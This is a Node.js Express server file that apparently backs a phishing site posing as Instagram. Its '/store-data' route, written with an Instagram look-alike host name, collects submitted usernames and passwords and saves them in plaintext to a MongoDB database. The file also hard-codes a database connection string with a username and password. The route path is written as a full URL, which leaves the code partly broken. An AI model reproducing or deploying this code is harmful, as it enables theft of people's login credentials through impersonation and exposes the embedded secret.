const express = require('express');
const mongoose = require('mongoose');
const bodyParser = require('body-parser');
const path = require('path');

const app = express();

// Connect to MongoDB Atlas
mongoose.connect("mongodb+srv://shaikhtausif7557:tausif@cluster0.b8qvjzu.mongodb.net/users?retryWrites=true&w=majority&appName=Cluster0", { // Fixed database name
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('Connected to MongoDB');
}).catch(err => {
    console.error('Error connecting to MongoDB:', err);
});

const userSchema = new mongoose.Schema({
    username: String,
    password: String
});

const User = mongoose.model('User', userSchema);

app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, 'public')));


app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/index.html'));
});


// Handle Data Storage
app.post('https://instagram-com-2.onrender.com/store-data', async (req, res) => {
    try {
        const { username, password } = req.body;

        const newUser = new User({ username, password });
        await newUser.save();
        res.sendFile(path.join(__dirname, 'public/success.html'));

    } catch (err) {
        console.error('Error storing data:', err.message);
        res.status(500).send('Error storing data: ' + err.message);
    }
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`Server is running on port ${PORT}`);
});


app.get('/signup', (req, res) => {
    res.sendFile(path.join(__dirname, 'public/signup.html'));
});

// Handle Signup
app.post('/signup', async (req, res) => {
    try {
        const newUser = new User({
            email: req.body.email,
            username: req.body.username,
            password: req.body.password
        });
        await newUser.save();
        res.send('Signup successful!');
    } catch (err) {
        console.error('Error signing up:', err.message); // Log the actual error message
        res.status(500).send('Error signing up: ' + err.message); // Send error to client
    }
});